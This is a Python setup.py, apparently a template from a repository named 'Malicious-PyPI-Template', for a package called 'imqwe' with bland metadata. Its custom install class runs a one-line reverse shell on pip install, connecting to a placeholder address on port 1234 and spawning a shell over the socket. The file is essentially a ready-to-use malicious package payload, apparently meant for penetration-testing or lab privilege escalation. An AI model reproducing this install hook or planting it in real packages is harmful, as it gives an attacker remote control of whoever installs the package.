from setuptools import setup
from setuptools.command.install import install

# author: zhsh9
# github: https://github.com/zhsh9

class ImQWE(install):
    def run(self):
        # [!] Insert code here
        # [!] reverse shell to local ip
        import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.xx.xx",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")

setup(
    name = "imqwe",
    version = "0.0.1",
    keywords = ["pip", "stusystem"],
    description = " im qwe.",
    long_description = " I'm qwe and this is my code.",
    license = "MIT Licence",
    url = "http://github.com/zhsh9/Malicious-PyPI-Template.git",
    author = "qwe",
    author_email = "qwe@qwe.com",
    include_package_data = True,
    platforms = "any",
    install_requires = [],
    zip_safe = False,
    cmdclass = { 'install': ImQWE }
)